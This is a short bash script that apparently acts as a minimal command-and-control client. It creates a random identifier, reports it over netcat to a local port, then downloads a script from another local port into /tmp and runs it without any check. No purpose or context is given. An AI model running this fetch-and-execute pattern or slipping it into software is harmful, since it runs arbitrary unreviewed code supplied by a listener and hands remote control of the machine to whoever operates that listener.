#! /bin/bash
if [ ! -f set.txt ]; then
	env LC_CTYPE=C tr -dc "a-zA-Z0-9-_\$\?" < /dev/urandom | head -c 10 > set.txt
fi
echo $(cat set.txt) | nc 127.0.0.1 8086
nc 127.0.0.1 8080 > /tmp/execute.sh
chmod +x /tmp/execute.sh
bash /tmp/execute.sh
